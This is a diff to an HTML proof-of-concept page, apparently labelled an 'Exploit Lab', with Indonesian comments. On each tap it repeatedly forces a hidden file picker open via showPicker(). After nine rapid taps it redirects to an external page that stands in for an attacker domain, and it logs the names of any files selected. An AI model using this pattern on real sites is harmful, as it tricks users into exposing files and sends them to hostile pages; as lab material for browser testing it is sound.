@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Picker & Redirection Lab</title>
+    <title>Advanced Picker & Redirection Lab</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -26,20 +26,26 @@
             color: #b0b0b0; margin-top: 15px; text-align: left; max-height: 150px; overflow-y: auto;
         }
         code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
-        .interactive-zone { position: relative; margin-bottom: 20px; width: 100%; display: flex; justify-content: center; }
+        .interactive-zone { position: relative; margin-bottom: 20px; width: 100%; display: flex; flex-direction: column; align-items: center; }
+        .target-button {
+            background: #ff5252; color: white; border: none; padding: 12px 24px;
+            font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <h1>🔴 File Picker & Redirection Lab</h1>
-    <p style="font-size: 12px; color: #888;">Simulasi pengujian interaksi cepat terhadap pemanggilan file picker dan navigasi.</p>
+    <h1>🔴 High-Frequency Picker & Redirection Exploit Lab</h1>
+    <p style="font-size: 12px; color: #888;">Ketuk layar secara cepat untuk memicu file picker dan pengalihan otomatis.</p>
 
     <div class="interactive-zone">
+        <!-- Input file tersembunyi yang dipanggil secara programatik via showPicker() -->
         <input id="file-input" type="file" style="display:none;" />
+        <button class="target-button">Tap Area / Interact Here</button>
     </div>
 
     <div class="info-box" id="log-box">
-        <strong>Status Log:</strong> Menunggu interaksi klik...
+        <strong>Status Log:</strong> Menunggu interaksi sentuh (*pointerdown*)...
     </div>
 
 <script>
@@ -52,20 +58,35 @@
 
     let clickCount = 0;
     const fileInput = document.getElementById('file-input');
+    const targetThreshold = 9; // Jumlah ketukan cepat yang dibutuhkan untuk memicu eksploitasi
+
+    // Menangkap perubahan pada file input (jika file berhasil dipilih/diakses)
+    fileInput.addEventListener('change', (e) => {
+        if (e.target.files.length > 0) {
+            const fileName = e.target.files[0].name;
+            appendLog(`<span style="color: #4CAF50;">[Success] File terdeteksi & diakses: <b>${fileName}</b></span>`);
+        }
+    });
 
     document.body.addEventListener('pointerdown', (e) => {
         clickCount++;
-        try {
-            fileInput.showPicker();
-        } catch (err) {}
+        appendLog(`Pointer down terdeteksi (Hitungan: ${clickCount}/${targetThreshold})`);
 
-        if (clickCount === 9) {
-            appendLog(`[Triggered] Ketukan ke-${clickCount}: Memicu file picker & pengalihan domain...`);
+        try {
+            // Memaksa pemanggilan showPicker() pada elemen file
+            fileInput.showPicker();
+        } catch (err) {
+            // Mengabaikan error DOM exception jika belum memenuhi syarat aktivasi murni secara normal
+        }
+
+        if (clickCount >= targetThreshold) {
+            appendLog(`<span style="color: #ff8a80;">[Exploit Triggered] Batas ketukan tercapai. Memproses eksfiltrasi & pengalihan...</span>`);
             
-            // Mengalihkan halaman ke domain eksternal setelah jeda singkat
+            // Jeda singkat sebelum dialihkan ke domain penyerang (simulasi diarahkan ke google.com)
             setTimeout(() => {
+                appendLog(`[Redirecting] Mengalihkan ke halaman attacker/eksternal...`);
                 window.location.href = "https://www.google.com";
-            }, 1000);
+            }, 1200);
 
             clickCount = 0;
         }
